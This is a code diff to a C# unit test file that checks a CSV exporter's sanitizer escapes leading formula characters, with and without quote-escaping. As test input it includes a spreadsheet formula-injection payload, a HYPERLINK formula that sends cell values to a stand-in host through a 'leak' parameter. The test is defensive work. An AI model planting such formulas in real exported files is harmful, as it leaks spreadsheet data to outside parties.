@@ -580,7 +580,7 @@ namespace DelimitedDataParser
         [InlineData("-", "'-")]
         [InlineData("@", "'@")]
         [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"'=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")")]
-        public void Sanitizer_Escapes_Blacklisted_Characters(string inputString, string expectedOutput)
+        public void Sanitizer_Escapes_Blacklisted_Characters_WithoutEscapeCharacters(string inputString, string expectedOutput)
         {
             var input = CreateDataTable();
             AddColumn(input, "One");
@@ -598,6 +598,34 @@ namespace DelimitedDataParser
 
             Assert.Equal(
                 "One,Two" + Environment.NewLine
+                + string.Concat(expectedOutput + ",", expectedOutput),
+                output);
+        }
+
+        [Theory]
+        [InlineData("=", @"""'=""")]
+        [InlineData("+", @"""'+""")]
+        [InlineData("-", @"""'-""")]
+        [InlineData("@", @"""'@""")]
+        [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"""'=HYPERLINK(""""http://example.com?leak=""""&A1&A2, """"Click here"""")""")]
+        public void Sanitizer_Escapes_Blacklisted_Characters_WithEscapeCharacters(string inputString, string expectedOutput)
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, inputString, inputString);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = true,
+                SanitizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                @"""One"",""Two""" + Environment.NewLine
                 + string.Concat(expectedOutput + ",", expectedOutput),
                 output);
         }
